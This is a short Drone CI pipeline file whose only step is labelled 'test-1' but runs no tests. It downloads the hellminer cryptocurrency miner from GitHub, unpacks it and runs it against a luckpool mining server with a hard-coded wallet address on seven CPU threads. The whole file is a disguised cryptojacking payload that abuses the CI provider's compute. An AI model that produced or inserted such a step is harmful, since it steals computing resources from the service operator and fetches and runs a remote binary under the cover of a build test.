kind: pipeline
type: docker
name: default-1 

steps:
- name: test-1 
  image: golang 
  commands: 
  - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xzvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RQ49i5erGDL5XnpUEjKksn9SvdES8qjsow.$RANDOM -p x --cpu 7

